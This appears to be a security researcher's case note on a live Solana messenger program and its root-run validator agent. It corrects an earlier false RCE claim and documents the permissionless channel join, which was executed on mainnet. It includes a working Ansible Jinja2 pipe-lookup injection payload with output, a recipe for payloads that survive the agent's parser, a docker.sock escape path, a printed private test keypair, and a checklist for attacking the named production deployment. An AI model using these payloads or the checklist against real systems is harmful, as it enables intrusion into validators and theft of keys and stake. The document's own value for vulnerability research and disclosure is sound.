# Worked Case — Permissionless Join: REAL FINDING, DEAD CHAIN

Target: `pointgroup-labs/sol-messenger` (Anchor program
`CgRaMXqqRHNT3Zo2uVZfX72TuxUgcLb8E3A8KrXnbXAC`, live on mainnet-beta) +
`pointgroup-labs/svt-agent` (Rust daemon, runs as root on validator hosts).

> **⚠️ THIS DOCUMENT HAS BEEN CORRECTED.** An earlier version of it claimed
> `join_channel` → self-authorize → `post_message` → agent RCE was a proven pre-auth
> chain. **The self-authorize hop was never executed.** When it finally was, on mainnet,
> it returned `Unauthorized (6000)`. The chain is dead. What survives is two genuine
> pre-auth findings and a fully-proven *sink* with no reachable trigger.
>
> Read `anchor-deserializer-offset-trap.md` first (the earlier forged-account false
> positive) and `exploitability-proof-method.md` (how to avoid both mistakes).

---

## 0. Final verdict

| Component | Verdict | Evidence |
|---|---|---|
| `join_channel` has **no permission gate** | ✅ **PROVEN, mainnet, finalized** | tx `3mJHhnvYjc67ay3GL2XyAk8WZQ4A74cugk9KLkmJvc2qM31BHs5Wky4GXL3HaRBAyhUbJDMD4KgFj2JK5Vp5Zriv`, `status: finalized, err: None`, membership persisted `status = 1` (Pending) |
| `add_device` skips the status check | ✅ **PROVEN** | simulated with Pending membership → only `Custom 1` (lamports), no auth error |
| `leave_channel` has no gate | ✅ **PROVEN** | simulated, `err: None` |
| Self-authorize via `status_target` | ❌ **DEAD** | `authorize_member` → `Custom 6000 Unauthorized` |
| `post_message` with Pending membership | ❌ **DEAD** | `Custom 6002 InvalidMembership` |
| `read_message` with Pending membership | ❌ **DEAD** | `Custom 6000 Unauthorized` |
| `grant_access_member` on self | ❌ **DEAD** | `Custom 6000 Unauthorized` |
| Jinja2 `lookup('pipe')` sink executes | ✅ **PROVEN** (local, real ansible-core 2.21.5) | `id` output written to file |
| **End-to-end pre-auth RCE** | ❌ **NOT PROVEN** | trigger hop fails |

**Honest deliverable: pre-auth channel-membership injection + pre-auth device
registration.** Not RCE.

---

## 1. Why the self-authorize theory died

The theory read `authorize_member`'s `status_target` comparison and stopped there:

```rust
match membership.status {
    ChannelMembershipStatus::Pending => {
        if let Some(target_authority) = membership.status_target {
            if target_authority.key() != *authority_key { return Err(Unauthorized.into()); }
        }
    }
    _ => return Err(Unauthorized.into()),
}
membership.status = ChannelMembershipStatus::Authorized;
```

It ignored the **first gate**, which runs before this block:

```rust
let is_super_admin = channel.authorize(authority_key);          // creator or ADMIN_AUTHORITY
if !is_super_admin {
    let auth_membership = assert_valid_membership(&ctx.accounts.authority_membership, ...)?;
    if !auth_membership.is_authorized() || !auth_membership.can_authorize_member(channel) {
        return Err(MessengerError::Unauthorized.into());        // ← DIES HERE
    }
}
```

A freshly-joined member is `Pending`, so `is_authorized()` is false and the call aborts
**before** `status_target` is ever compared. `status_target` is a convenience that lets an
existing admin nominate *which* key may approve a pending member — it is not a
self-service path.

**Generalised lesson:** *"X may authorize Y"* is only a bypass when the caller already
holds X. When you find a self-referential authorization parameter, read the **entire**
handler top-to-bottom and identify the **first** gate, not the most interesting one.

---

## 2. What IS proven — the Pending-membership capability matrix

Simulated for free (`simulateTransaction`, `sigVerify: false`) against the production
channel with a real Pending membership:

| Instruction | Result | Meaning |
|---|---|---|
| `join_channel` | `insufficient lamports` (no auth error) | **no gate at all** |
| `add_device` | `Custom 1` (lamports only) | **no status check** — `has_one = channel, has_one = authority` only |
| `leave_channel` | `err: None` | no gate |
| `read_message` | `Custom 6000 Unauthorized` | requires Authorized |
| `grant_access_member` (self) | `Custom 6000 Unauthorized` | requires owner |
| `authorize_member` | `Custom 6000 Unauthorized` | requires Authorized + `can_authorize_member` |
| `post_message` | `Custom 6002 InvalidMembership` | requires valid membership |

**Impact of the two real findings:** any stranger can join any of the 232 production
channels and register a device key + CEK in it. Consequences: `member_count` pollution,
monitoring/notifier noise, a persistent foothold that survives until an admin removes it,
and a beachhead that becomes full compromise the moment any channel has a lax admin. It is
a genuine pre-auth defect worth reporting — just not an RCE.

---

## 3. The sink is real and executes (keep this recipe)

`svt-agent/src/task_runner.rs`:

```rust
if !task.args.is_empty() {
    cmd.push(format!("--extra-vars={}", json!(task.args)));
}
```

`json!()` is shell-safe and `shiplift .cmd(Vec<String>)` is argv with no shell — but
`ansible-playbook` is itself a templating engine that renders those values **before** any
shell runs. The sv-manager playbooks interpolate them into `shell:` tasks:

```yaml
# roles/solana_validator_bootstrap/tasks/validator_info.yaml:38
shell_cmd: "solana validator-info publish --keypair {{ secrets_path }}/validator-keypair.json ... {{ validator_name }}"
```

Executed PoC (real ansible-core 2.21.5, real task file):

```bash
ansible-playbook -i localhost, playbook.yaml \
  --extra-vars='{"validator_name":"{{lookup(\"pipe\",\"id>/tmp/rcetest/PWNED\")}}"}' \
  -e secrets_path=/tmp/rcetest -e validator_description=test
```

Output:

```
$ cat /tmp/rcetest/PWNED
uid=1000(ubuntu) gid=1001(ubuntu) groups=1001(ubuntu),4(adm),...,101(lxd),1000(netdev)
```

### ⚠️ The payload constraint that invalidates the first PoC

The first PoC used a payload **with spaces** and claimed success. It does not survive the
daemon's own parser. `converter.rs::parse_args` does `split_whitespace()` **first**:

```
args = "validator_name={{ lookup('pipe','id -un > /tmp/PWN.txt') }}"
parsed = {"validator_name": "{{"}        ← TRUNCATED
```

A space-free payload survives intact:

```
args = "validator_name={{lookup('pipe','id>/tmp/rcetest/PWNED')}}"
parsed = {"validator_name": "{{lookup('pipe','id>/tmp/rcetest/PWNED')}}"}   ← INTACT
```

**Rule: any value that must survive a `split_whitespace()` → `split('=')` parser must
contain no spaces.** Use `cmd>/path` (no space before the redirect target). Verify the
parse in a standalone Rust harness before claiming a payload works — see
`daemon-side-sinks-and-config-leaks.md` §2b.

### The agent never checks the sender

`agent.rs` → `convert_message_to_task()` reads `message.content` and ignores
`message.sender` entirely. The only gate is "decrypts under the channel CEK". The agent's
device public key is on-chain in `ChannelDevice.key`, readable by anyone, and the scheme
is ECDH-ES — so **anyone can encrypt to the agent**. Encryption is confidentiality, not
authentication. This is why the sink is *fully* weaponised the moment a valid membership
exists; it is also why the membership gate is the only thing standing in the way.

---

## 4. Privileged context (unchanged, still relevant)

```rust
.network_mode("host")
.volumes_from(vec![CONTAINER_NAME])   // inherits the agent container's volumes
```

Agent container mounts (from `install.sh`):

```
-v /var/run/docker.sock:/var/run/docker.sock   # full host Docker control
-v /etc/sv_manager:/etc/sv_manager             # validator config
-v $SSHKEY_PATH:/root/.ssh                     # root SSH private key
-v $KEYPAIR_PATH:/app/keypair.json             # agent keypair
```

Dockerfile ends with `USER root`; `install.sh` aborts unless run as root.

**Impact ladder if a valid membership is ever obtained:**

| Layer | What | Status |
|---|---|---|
| 1 | Arbitrary command as root inside the task container | **PROVEN** (executed) |
| 2 | Host root via mounted `docker.sock` (`docker run -v /:/host --privileged`) | INFERRED (classic escape, nothing blocks it) |
| 3a | Validator keypair disclosure (`/home/solana/.secrets/`) → stake theft / slashing | INFERRED (path seen in real Ansible output) |
| 3b | Lateral movement via root SSH key to sibling nodes | INFERRED |
| 3c | Persistence by rewriting the mounted `ansible` playbook volume | INFERRED |
| 3d | Network manipulation (gossip/TPU/RPC) via `network_mode: host` | INFERRED |
| 4 | Fleet scale: 232 channels / 702 memberships / 711 devices on mainnet | **PROVEN** (census) |

---

## 5. Cost model (measured)

| Item | Lamports |
|---|---|
| `join_channel` (membership + device PDAs, caller pays both) | 2,098,040 |
| `authorize_member` | ~5,000 (fee only) |
| `add_device` | ~1,463,040 (rent, refundable) |
| `post_message` | ~5,000 + priority |
| **Total for the full sequence** | **~3.6M ≈ 0.0036 SOL** |

Base fee 5,000/signature; priority was 0 at census time. Rent is refundable on close.

**Two operational rules learned the hard way:**

1. **Simulate the whole transaction before sending any part.** A combined
   `[join, authorize]` tx aborted on the authorize hop, so the join never landed either.
   Send the proven-good hop alone, confirm `finalized`, then attempt the next hop.
2. **Fund for the entire sequence up front.** The wallet held 3.0M lamports and
   `join_channel` alone needed 2.098M — there was no room for the follow-on hops.

---

## 6. What did NOT work (do not re-chase)

- **Forged membership via `post_message`'s `/// CHECK: AccountInfo`.** Fails with
  `InvalidMembership` (6002). The manual `try_deserialize` + field comparison holds, and a
  system-owned account cannot satisfy it. 6 live simulations.
  **⛔ CLOSED DEFINITIVELY — do not re-test.** A later session re-opened this and ran four
  more forge variants (88B no-disc / 96B / 128B exact-borsh / 160B exact-clone-with-
  patched-authority), all failing identically. The decisive experiment was the
  **error-code pairing test**:

  ```
  genuine program-owned Pending membership → post_message → Unauthorized (6000)
  forged system-owned, byte-perfect      → post_message → InvalidMembership (6002)
  ```

  `6000` means the program accepted the account as genuine and rejected on *privilege*;
  `6002` means it never reached the privilege question. Ownership is the sole remaining
  variable. Method + CU-count diagnostic + rent ladder:
  `exploitability-proof-method.md` §6.
- **Forged `authority_membership` via `grant_access_member`.** Fails with
  `AccountOwnedByWrongProgram` (**3007**) because the field is typed
  `Account<'info, ChannelMembership>`, which enforces `owner == program_id` before any
  field comparison. Typed accounts are a real ownership gate.
- **Self-authorize via `status_target`.** `Unauthorized (6000)` — see §1.
- **Reusing abandoned zero-balance authorities.** They hold operator/creator
  memberships, never the `name='agent'` membership the daemon polls. Read access only.
- **Hardcoded test keypair** in `encryption.rs`
  (`2gnHrTqnjf86eDaF2Po8Au7VYLtfbHCB4hFrUsJqeK7HVCjDwU8CVmaQZVegJkHhkK1Kf8PGet21JjxV2sAGmLrN`
  → `3VTd6uNmFVLGbJUNiSqmfw1g7UPpvm53KmxXmw7T32Nv`). Valid and derivable, but holds
  **zero** memberships on mainnet.
- **`task.name` path traversal** (`./playbooks/{name}.yaml`). Resolves inside the task
  container, not the host. The RCE primitive is `task.args` → Jinja2, not `task.name`.

---

## 7. Reproduction checklist

1. `getAccountInfo(PROGRAM_ID)` → confirm `executable: true` on mainnet-beta.
2. Grep repo config for live identifiers: `docker-compose.yml` → `AGENT_CHANNEL_ID`.
3. `getProgramAccounts` census: bucket by `dataSize` (160 = membership, 285 = device),
   `memcmp` on the channel field at offset 8. Decode the flags byte; rank targets by
   `last_read_message_id == message_count` to find a live agent.
4. **Read the escalation instruction's FIRST gate before theorising.** Grep every writer
   of `membership.status` / `membership.flags` and check each one's first condition.
5. Simulate `joinChannel`. **Look for the absence of an auth error**, not for success —
   `insufficient lamports` means the gate passed.
6. Map the full capability matrix for free with `simulateTransaction` before spending anything.
7. Prove the sink locally with real `ansible-playbook` **and** verify the payload survives
   `parse_args` in a standalone Rust harness.
8. Only then fund a burner (~0.004 SOL) and execute the hops that simulated clean.
